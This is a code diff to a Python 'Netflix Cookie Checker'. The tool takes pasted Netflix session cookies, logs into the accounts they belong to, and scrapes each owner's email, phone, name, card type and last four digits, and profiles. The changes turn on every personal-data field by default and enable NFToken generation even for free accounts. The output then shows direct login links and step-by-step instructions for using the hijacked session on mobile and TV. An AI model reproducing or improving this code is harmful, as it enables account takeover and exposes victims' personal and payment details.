@@ -16,26 +16,26 @@ except ImportError:
 
 DEFAULT_CONFIG = {
     "txt_fields": {
-        "name": False,
-        "email": False,
+        "name": True,
+        "email": True,
         "max_streams": True,
         "plan_price": True,
         "plan": True,
         "country": True,
-        "member_since": False,
+        "member_since": True,
         "next_billing": True,
         "extra_members": True,
         "payment_method": True,
-        "card": False,
-        "phone": False,
+        "card": True,
+        "phone": True,
         "quality": True,
-        "hold_status": False,
-        "email_verified": False,
-        "membership_status": False,
+        "hold_status": True,
+        "email_verified": True,
+        "membership_status": True,
         "profiles": True,
-        "user_guid": False,
+        "user_guid": True,
     },
-    "nftoken": False,
+    "nftoken": True,
     "retries": {
         "error_proxy_attempts": 3,
         "nftoken_attempts": 1,
@@ -44,20 +44,28 @@ DEFAULT_CONFIG = {
         "request_timeout_seconds": 15,
         "fallback_account_page": True,
         "retry_incomplete_info": True,
-        "nftoken_for_free": False,
+        "nftoken_for_free": True,
     },
 }
 
 BANNER = """
-███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
+\033[91m███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
 ████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
 ██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
 ██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
 ██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
-╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
+╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝\033[0m
 """
 
-APP_VERSION = "4.5.0"
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+BLUE = "\033[94m"
+MAGENTA = "\033[95m"
+CYAN = "\033[96m"
+WHITE = "\033[97m"
+BOLD = "\033[1m"
+RESET = "\033[0m"
 
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_QUERY_PARAMS = {
@@ -132,6 +140,17 @@ MONTH_ALIASES = {
     "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10, "oktober": 10, "ottobre": 10, "říjen": 10,
     "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "novembre": 11, "noiembrie": 11,
     "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "desember": 12, "dicembre": 12, "décembre": 12, "prosinec": 12,
+}
+
+CARD_TYPES = {
+    "VISA": "VISA",
+    "MASTERCARD": "MASTERCARD",
+    "AMEX": "AMEX",
+    "AMERICAN EXPRESS": "AMEX",
+    "DISCOVER": "DISCOVER",
+    "JCB": "JCB",
+    "DINERS": "DINERS",
+    "CC": "CARD",
 }
 
 
@@ -298,14 +317,9 @@ def extract_json_cookie_entries(content):
         if not is_netflix_cookie_entry(domain, name):
             continue
         entries.append(build_netscape_cookie_entry(
-            domain,
-            "TRUE" if str(domain).startswith(".") else "FALSE",
-            cookie.get("path", "/"),
-            "TRUE" if cookie.get("secure", False) else "FALSE",
-            cookie.get("expirationDate", cookie.get("expiration", 0)),
-            name,
-            cookie.get("value", ""),
-            index,
+            domain, "TRUE" if str(domain).startswith(".") else "FALSE",
+            cookie.get("path", "/"), "TRUE" if cookie.get("secure", False) else "FALSE",
+            cookie.get("expirationDate", cookie.get("expiration", 0)), name, cookie.get("value", ""), index,
         ))
     return entries
 
@@ -325,8 +339,7 @@ def extract_raw_cookie_entries(raw_text):
         else:
             value = value.rstrip(",")
         entries.append(build_netscape_cookie_entry(
-            ".netflix.com", "TRUE", "/",
-            "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
+            ".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
             "0", cookie_name, value, index
         ))
     return entries
@@ -357,10 +370,7 @@ def build_cookie_bundles_from_entries(entries):
             continue
         selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
         netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
-        bundles.append({
-            "netscape_text": netscape_text,
-            "cookies": cookies_dict_from_netscape(netscape_text),
-        })
+        bundles.append({"netscape_text": netscape_text, "cookies": cookies_dict_from_netscape(netscape_text)})
     return bundles
 
 
@@ -434,7 +444,14 @@ def extract_profile_names(response_text):
             decoded = decode_netflix_value(found)
             if decoded and decoded not in names:
                 names.append(decoded)
-    return ", ".join(names) if names else None
+    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
+        snippet = response_text[match.start():match.start() + 1200]
+        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
+        if name_match:
+            decoded = decode_netflix_value(name_match.group(1))
+            if decoded and decoded not in names:
+                names.append(decoded)
+    return names
 
 
 def has_complete_account_info(info):
@@ -474,6 +491,7 @@ def extract_info_from_graphql_payload(response_text):
     payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
     payment_typename = str(payment_method.get("__typename") or "")
     payment_display_text = decode_netflix_value(payment_method.get("displayText"))
+    payment_logo = decode_netflix_value((payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo"))
     profiles = growth_account.get("profiles") or []
     phone_digits = None
     phone_verified_graphql = None
@@ -561,27 +579,35 @@ def extract_info_from_graphql_payload(response_text):
         "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
         "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
         "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
-        "paymentMethodType": decode_netflix_value(payment_method.get("paymentOptionLogo", {}).get("paymentOptionLogo") or growth_account.get("payer")),
+        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
+        "paymentMethodDisplay": payment_display_text,
         "maskedCard": None,
         "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
         "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
         "holdStatus": hold_status,
         "emailVerified": format_boolean_label(email_verified),
         "phoneVerified": format_boolean_label(phone_verified_graphql),
-        "profiles": ", ".join(profile_names) if profile_names else None,
+        "profiles": profile_names,
         "maxStreams": decode_netflix_value(current_plan.get("maxStreams")),
     }
 
-    if "Card" in payment_typename:
-        info["paymentMethodType"] = "CC"
-        if payment_display_text:
+    if "Card" in payment_typename or payment_display_text:
+        if payment_display_text and re.fullmatch(r"\d{4}", payment_display_text):
             info["maskedCard"] = payment_display_text
-    elif payment_display_text and not re.fullmatch(r"\d{4}", payment_display_text):
-        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text
+        elif payment_display_text:
+            info["maskedCard"] = payment_display_text
+            last4_match = re.search(r"(\d{4})", payment_display_text)
+            if last4_match:
+                info["maskedCard"] = last4_match.group(1)
 
-    if not info["paymentMethodType"] and payment_methods:
-        if "Card" in payment_typename:
+    if not info["paymentMethodType"] and payment_display_text:
+        if re.fullmatch(r"\d{4}", payment_display_text):
             info["paymentMethodType"] = "CC"
+        else:
+            info["paymentMethodType"] = payment_display_text
+
+    if not info["paymentMethodType"] and "Card" in payment_typename:
+        info["paymentMethodType"] = "CC"
 
     return {key: value for key, value in info.items() if value not in (None, "", [], {})}
 
@@ -629,9 +655,7 @@ def extract_info(response_text):
                 r'"showExtraMemberSection"\s*:\s*(true|false)',
             ]),
             "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
-            "maxStreams": extract_first_match(response_text, [
-                r'"maxStreams"\s*:\s*"?([^",}]+)"?',
-            ]),
+            "maxStreams": extract_first_match(response_text, [r'"maxStreams"\s*:\s*"?([^",}]+)"?']),
             "localizedPlanName": extract_first_match(response_text, [
                 r'"localizedPlanName"\s*:\s*"([^"]+)"',
                 r'"planName"\s*:\s*"([^"]+)"',
@@ -696,6 +720,8 @@ def extract_info(response_text):
     extracted.setdefault("countryOfSignup", None)
     extracted.setdefault("membershipStatus", None)
     extracted.setdefault("localizedPlanName", None)
+    extracted.setdefault("profiles", [])
+    extracted.setdefault("paymentMethodDisplay", None)
 
     if extra_member_by_response_text:
         extracted["isExtraMemberAccount"] = "Yes"
@@ -710,6 +736,18 @@ def extract_info(response_text):
         if extracted.get("paymentMethodType") in {None, "", "Yes"}:
             extracted["paymentMethodType"] = "CC"
 
+    if extracted["paymentMethodDisplay"] and re.fullmatch(r"\d{4}", extracted["paymentMethodDisplay"]):
+        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
+            extracted["paymentMethodType"] = "CC"
+        extracted["maskedCard"] = extracted["paymentMethodDisplay"]
+
+    if not extracted["maskedCard"]:
+        for value in [extracted.get("paymentMethodDisplay"), extracted.get("paymentMethodType")]:
+            if value and re.search(r"\d{4}", str(value)):
+                match = re.search(r"(\d{4})", str(value))
+                extracted["maskedCard"] = match.group(1)
+                break
+
     if extracted["holdStatus"] is None:
         membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
         if membership_status_key == "current_member":
@@ -723,14 +761,10 @@ def extract_info(response_text):
     phone_number = extracted.get("phoneNumber")
     extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))
 
-    profiles = extracted.get("profiles")
-    if profiles:
-        profile_count = len([name for name in profiles.split(", ") if name])
-        extracted["profileCount"] = profile_count
-        extracted["profilesDisplay"] = profiles
+    if extracted.get("profiles"):
+        extracted["profileCount"] = len(extracted["profiles"])
     else:
-        extracted["profileCount"] = None
-        extracted["profilesDisplay"] = None
+        extracted["profileCount"] = 0
 
     return extracted
 
@@ -771,9 +805,9 @@ def derive_plan_info(info, is_subscribed):
     normalized = normalize_plan_key(raw_plan) if raw_plan else ""
 
     plan_aliases = {
-        "premium": {"premium", "cao_cap", "premium_plan"},
+        "premium": {"premium", "cao_cap", "premium_plan", "ultra_hd", "4k"},
         "standard_with_ads": {"standard_with_ads", "standardwithads"},
-        "standard": {"standard", "estandar", "padrao"},
+        "standard": {"standard", "estandar", "padrao", "hd", "full_hd"},
         "basic": {"basic", "basico", "basique", "basis"},
         "mobile": {"mobile", "ponsel", "seluler", "movil"},
     }
@@ -782,10 +816,9 @@ def derive_plan_info(info, is_subscribed):
             return canonical, canonical.replace("_", " ").title()
 
     if streams is not None:
-        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
-        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
+        if streams >= 4:
             return "premium", "Premium"
-        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
+        if streams >= 2:
             return "standard", "Standard"
         if streams == 1:
             return "basic", "Basic"
@@ -835,7 +868,7 @@ def is_on_hold_account(info):
     return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused", "suspend"))
 
 
-def normalize_output_value(value, unknown_fallback="UNKNOWN"):
+def normalize_output_value(value, unknown_fallback="N/A"):
     cleaned = decode_netflix_value(value)
     if cleaned is None or cleaned == "":
         return unknown_fallback
@@ -908,10 +941,20 @@ def parse_localized_date(cleaned):
         return None
 
 
-def format_display_date(value):
+def format_date_iso(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
-        return "UNKNOWN"
+        return "N/A"
+    parsed = parse_localized_date(cleaned)
+    if parsed is not None:
+        return parsed.strftime("%Y-%m-%d")
+    return cleaned
+
+
+def format_date_display(value):
+    cleaned = decode_netflix_value(value)
+    if not cleaned:
+        return "N/A"
     parsed = parse_localized_date(cleaned)
     if parsed is not None:
         return parsed.strftime("%B %d, %Y").replace(" 0", " ")
@@ -921,7 +964,7 @@ def format_display_date(value):
 def format_member_since(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
-        return "UNKNOWN"
+        return "N/A"
     parsed = parse_localized_date(cleaned)
     if parsed is not None:
         return parsed.strftime("%B %Y")
@@ -936,6 +979,48 @@ def format_member_since(value):
         except Exception:
             pass
     return cleaned
+
+
+def get_card_type(payment_info):
+    if not payment_info:
+        return None
+    upper_info = str(payment_info).upper()
+    for card_name, card_label in CARD_TYPES.items():
+        if card_name in upper_info:
+            return card_label
+    if re.search(r"\d{4}", str(payment_info)):
+        return "CARD"
+    return None
+
+
+def format_payment_display(info):
+    payment_type = normalize_output_value(info.get("paymentMethodType"), None)
+    masked_card = info.get("maskedCard")
+    payment_display = info.get("paymentMethodDisplay")
+
+    if not payment_type and not masked_card and not payment_display:
+        return "N/A"
+
+    card_type = get_card_type(payment_type) or get_card_type(payment_display)
+
+    if card_type:
+        if masked_card and re.fullmatch(r"\d{4}", str(masked_card)):
+            return f"{card_type} ({masked_card})"
+        if payment_display and re.search(r"\d{4}", str(payment_display)):
+            match = re.search(r"(\d{4})", str(payment_display))
+            return f"{card_type} ({match.group(1)})"
+        return card_type
+
+    if masked_card and re.fullmatch(r"\d{4}", str(masked_card)):
+        return f"CC ({masked_card})"
+
+    if payment_display:
+        return str(payment_display)
+
+    if payment_type:
+        return str(payment_type)
+
+    return "N/A"
 
 
 def create_nftoken(cookie_dict, attempts=1):
@@ -958,10 +1043,7 @@ def create_nftoken(cookie_dict, attempts=1):
             token = decode_netflix_value(token_data.get("token"))
             expires = token_data.get("expires")
             if token:
-                return {
-                    "token": token,
-                    "expires_at_utc": get_nftoken_expiry_utc(expires),
-                }
+                return {"token": token, "expires_at_utc": get_nftoken_expiry_utc(expires)}
         except Exception:
             continue
     return None
@@ -1016,7 +1098,7 @@ def get_account_page(session, request_timeout=15, fallback_account_page=False):
 def check_single_cookie(cookie_content, config=None):
     if config is None:
         config = copy.deepcopy(DEFAULT_CONFIG)
-    
+
     retries_cfg = config.get("retries", {})
     performance_cfg = config.get("performance", {})
     max_retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
@@ -1025,7 +1107,7 @@ def check_single_cookie(cookie_content, config=None):
     fallback_account_page = bool(performance_cfg.get("fallback_account_page", True))
     retry_incomplete_info = bool(performance_cfg.get("retry_incomplete_info", True))
     nftoken_for_free = bool(performance_cfg.get("nftoken_for_free", False))
-    
+
     try:
         max_retry_attempts = max(1, int(max_retry_attempts))
     except Exception:
@@ -1038,25 +1120,25 @@ def check_single_cookie(cookie_content, config=None):
         request_timeout_seconds = max(5, int(request_timeout_seconds))
     except Exception:
         request_timeout_seconds = 15
-    
+
     bundles = extract_netflix_cookie_bundles(cookie_content)
     if not bundles:
-        return {"success": False, "error": "No valid Netflix cookies found in input"}
-    
+        return None, "No valid Netflix cookies found"
+
     bundle = bundles[0]
     cookies = bundle.get("cookies") or cookies_dict_from_netscape(bundle.get("netscape_text", ""))
-    
+
     if not cookies or not has_required_netflix_cookies(cookies):
-        return {"success": False, "error": "Missing required cookies (NetflixId required)"}
-    
+        return None, "Missing required cookies (NetflixId required)"
+
     session = requests.Session()
     for cookie_name, cookie_value in cookies.items():
         session.cookies.set(cookie_name, cookie_value, domain=".netflix.com", path="/")
-    
+
     response_text = None
     status_code = None
     extracted_info = None
-    
+
     for attempt in range(max_retry_attempts):
         try:
             response_text, status_code, extracted_info = get_account_page(
@@ -1071,93 +1153,149 @@ def check_single_cookie(cookie_content, config=None):
         except Exception:
             if attempt < max_retry_attempts - 1:
                 continue
-    
+
     if status_code == 200 and response_text:
         info = extracted_info or extract_info(response_text)
         if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
             is_subscribed = is_subscribed_account(info)
-            account_on_hold = is_subscribed and is_on_hold_account(info)
-            
-            result = {
-                "success": True,
-                "is_subscribed": is_subscribed,
-                "is_on_hold": account_on_hold,
-                "account_details": {}
-            }
-            
-            txt_fields = config.get("txt_fields", {})
-            field_mapping = {
-                "name": ("accountOwnerName", normalize_output_value),
-                "email": ("email", normalize_output_value),
-                "country": ("countryOfSignup", normalize_output_value),
-                "member_since": ("memberSince", format_member_since),
-                "next_billing": ("nextBillingDate", format_display_date),
-                "payment_method": ("paymentMethodType", normalize_output_value),
-                "card": ("maskedCard", lambda v: normalize_output_value(v, "N/A")),
-                "phone": ("phoneDisplay", normalize_output_value),
-                "quality": ("videoQuality", normalize_output_value),
-                "max_streams": ("maxStreams", lambda v: normalize_output_value(str(v).rstrip("}"))),
-                "plan_price": ("planPrice", lambda v: normalize_output_value(v, "N/A")),
-                "hold_status": ("holdStatus", normalize_output_value),
-                "extra_members": ("showExtraMemberSection", normalize_output_value),
-                "email_verified": ("emailVerified", normalize_output_value),
-                "membership_status": ("membershipStatus", normalize_output_value),
-                "profiles": ("profilesDisplay", normalize_output_value),
-                "user_guid": ("userGuid", normalize_output_value),
-            }
-            
-            for field_key, (info_key, formatter) in field_mapping.items():
-                if txt_fields.get(field_key, True):
-                    value = info.get(info_key)
-                    if value is not None:
-                        result["account_details"][field_key] = formatter(value)
-                    else:
-                        result["account_details"][field_key] = "UNKNOWN" if field_key != "card" else "N/A"
-            
-            result["plan"] = derive_plan_info(info, is_subscribed)[1]
-            result["profile_count"] = info.get("profileCount")
-            
+            nftoken_data = None
             if is_subscribed and config.get("nftoken"):
                 nftoken_data = create_nftoken(cookies, nftoken_retry_attempts)
-                if nftoken_data:
-                    result["nftoken"] = nftoken_data
             elif nftoken_for_free and not is_subscribed:
                 nftoken_data = create_nftoken(cookies, nftoken_retry_attempts)
-                if nftoken_data:
-                    result["nftoken"] = nftoken_data
-            
-            return result
+            return {"info": info, "is_subscribed": is_subscribed, "cookies": cookies, "nftoken": nftoken_data}, None
         else:
-            return {"success": False, "error": "Incomplete account page - could not extract country"}
-    
+            return None, "Incomplete account page - could not extract country"
+
     if status_code and status_code in {403, 429, 500, 502, 503, 504}:
         error_messages = {403: "HTTP 403 Forbidden", 429: "HTTP 429 Rate Limited", 500: "HTTP 500 Server Error",
                           502: "HTTP 502 Bad Gateway", 503: "HTTP 503 Service Unavailable", 504: "HTTP 504 Gateway Timeout"}
-        return {"success": False, "error": error_messages.get(status_code, f"HTTP {status_code}")}
-    
-    return {"success": False, "error": "Failed to access account page - cookie may be expired"}
+        return None, error_messages.get(status_code, f"HTTP {status_code}")
+
+    return None, "Failed to access account page - cookie may be expired"
+
+
+def display_result(data, error):
+    print(f"\n{BOLD}{RED}══════════════════════════════════════════════════{RESET}")
+
+    if error:
+        print(f"\n{RED}{BOLD}  ✗ ERROR{RESET}")
+        print(f"  {RED}{error}{RESET}")
+        print(f"\n{RED}══════════════════════════════════════════════════{RESET}")
+        return
+
+    info = data["info"]
+    is_subscribed = data["is_subscribed"]
+    nftoken_data = data.get("nftoken")
+    plan_key, plan_name = derive_plan_info(info, is_subscribed)
+
+    print(f"\n{GREEN}{BOLD}  ✓ ACCOUNT ACTIVE{RESET}" if is_subscribed else f"\n{YELLOW}{BOLD}  ⚠ FREE ACCOUNT (No Subscription){RESET}")
+
+    on_hold = is_on_hold_account(info)
+    if on_hold:
+        print(f"  {YELLOW}⚠ Account is ON HOLD{RESET}")
+
+    print(f"\n  {WHITE}{BOLD}Account Information:{RESET}")
+    print(f"  {CYAN}─{'─' * 40}{RESET}")
+
+    email = normalize_output_value(info.get("email"))
+    print(f"  {BOLD}Email:{RESET}        {email}")
+
+    phone = normalize_output_value(info.get("phoneDisplay"))
+    print(f"  {BOLD}Phone:{RESET}        {phone}")
+
+    print(f"  {BOLD}Plan:{RESET}         {GREEN}{plan_name}{RESET}")
+
+    payment = format_payment_display(info)
+    print(f"  {BOLD}Payment:{RESET}      {payment}")
+
+    profiles_list = info.get("profiles", [])
+    if profiles_list:
+        profiles_str = ", ".join(str(p) for p in profiles_list)
+    else:
+        profiles_str = "None"
+    profile_count = info.get("profileCount", 0)
+    print(f"  {BOLD}Profiles:{RESET}     {profiles_str} ({profile_count})")
+
+    country = normalize_output_value(info.get("countryOfSignup"))
+    print(f"  {BOLD}Country:{RESET}      {country}")
+
+    next_billing = format_date_iso(info.get("nextBillingDate"))
+    next_billing_display = format_date_display(info.get("nextBillingDate"))
+    print(f"  {BOLD}Next Bill:{RESET}    {next_billing_display}")
+
+    member_since = format_member_since(info.get("memberSince"))
+    print(f"  {BOLD}Since:{RESET}        {member_since}")
+
+    max_streams = _int_or_none(info.get("maxStreams"))
+    if max_streams is not None:
+        print(f"  {BOLD}Max Streams:{RESET}  {max_streams}")
+
+    quality = normalize_output_value(info.get("videoQuality"))
+    if quality and quality != "N/A":
+        print(f"  {BOLD}Quality:{RESET}      {quality}")
+
+    price = normalize_output_value(info.get("planPrice"), "N/A")
+    if price and price != "N/A":
+        print(f"  {BOLD}Price:{RESET}        {price}")
+
+    hold_status = normalize_output_value(info.get("holdStatus"))
+    if hold_status in {"Yes", "No"}:
+        print(f"  {BOLD}Hold Status:{RESET}  {hold_status}")
+
+    extra_member = normalize_output_value(info.get("showExtraMemberSection"))
+    if extra_member == "Yes":
+        print(f"  {BOLD}Extra Member:{RESET} {extra_member}")
+
+    email_verified = normalize_output_value(info.get("emailVerified"))
+    if email_verified in {"Yes", "No"}:
+        print(f"  {BOLD}Email Verified:{RESET} {email_verified}")
+
+    if nftoken_data and nftoken_data.get("token"):
+        token = nftoken_data["token"]
+
+        print(f"\n  {WHITE}{BOLD}NFToken Access Links:{RESET}")
+        print(f"  {CYAN}─{'─' * 40}{RESET}")
+
+        print(f"\n  {BOLD}Direct Watch:{RESET}")
+        print(f"  {BLUE}https://netflix.com/?nftoken={token}{RESET}")
+
+        print(f"\n  {BOLD}Mobile Watch:{RESET}")
+        print(f"  {YELLOW}To use mobile apps copy Direct Watch link to mobile Chrome.{RESET}")
+        print(f"  {YELLOW}Open in browser, change URL to:{RESET}")
+        print(f"  {BLUE}https://netflix.com/unsupported{RESET}")
+        print(f"  {YELLOW}It will suggest to open the app - click to login.{RESET}")
+
+        print(f"\n  {BOLD}TV Watch:{RESET}")
+        print(f"  {BLUE}https://netflix.com/tv2?nftoken={token}{RESET}")
+
+        expires = nftoken_data.get("expires_at_utc", "Unknown")
+        print(f"\n  {BOLD}Token Expires:{RESET} {YELLOW}{expires}{RESET}")
+
+    print(f"\n{RED}══════════════════════════════════════════════════{RESET}")
 
 
 def main():
     config = load_config()
-    
+
     print(BANNER)
-    print("\nNetflix Cookie Checker - Paste Mode")
-    print("=" * 50)
-    print("Paste your Netflix cookie (Netscape format)")
-    print("Type 'exit' to quit")
-    print("=" * 50)
-    
+    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════════════╗{RESET}")
+    print(f"{RED}{BOLD}║{RESET}         {WHITE}NETFLIX COOKIE CHECKER - PASTE MODE{RESET}       {RED}{BOLD}║{RESET}")
+    print(f"{RED}{BOLD}╚══════════════════════════════════════════════════╝{RESET}")
+    print(f"\n  {YELLOW}Paste your Netscape format cookie below{RESET}")
+    print(f"  {YELLOW}Type 'exit' to quit{RESET}")
+    print(f"  {CYAN}─{'─' * 44}{RESET}")
+
     while True:
-        print("\nEnter cookie (Press Enter twice when done, or type 'exit'):")
-        
+        print(f"\n{WHITE}Enter cookie (Press Enter twice when done):{RESET}")
+
         lines = []
         empty_count = 0
         while True:
             try:
                 line = input()
                 if line.strip().lower() == "exit":
-                    print("\nExiting...")
+                    print(f"\n{RED}Exiting...{RESET}")
                     return
                 if line.strip() == "":
                     empty_count += 1
@@ -1167,28 +1305,23 @@ def main():
                     empty_count = 0
                 lines.append(line)
             except EOFError:
-                print("\nExiting...")
+                print(f"\n{RED}Exiting...{RESET}")
                 return
-        
+
         cookie_input = "\n".join(lines).strip()
-        
+
         if not cookie_input:
-            print("No cookie input provided.")
+            print(f"  {YELLOW}No cookie input provided.{RESET}")
             continue
-        
-        print("\nChecking cookie...\n")
-        
-        result = check_single_cookie(cookie_input, config)
-        
-        print("=" * 50)
-        print("RESULT:")
-        print("=" * 50)
-        print(json.dumps(result, indent=2, ensure_ascii=False))
-        print("=" * 50)
+
+        print(f"\n  {YELLOW}Checking cookie...{RESET}")
+
+        data, error = check_single_cookie(cookie_input, config)
+        display_result(data, error)
 
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\nStopped by user.")
+        print(f"\n\n{RED}Stopped by user.{RESET}")
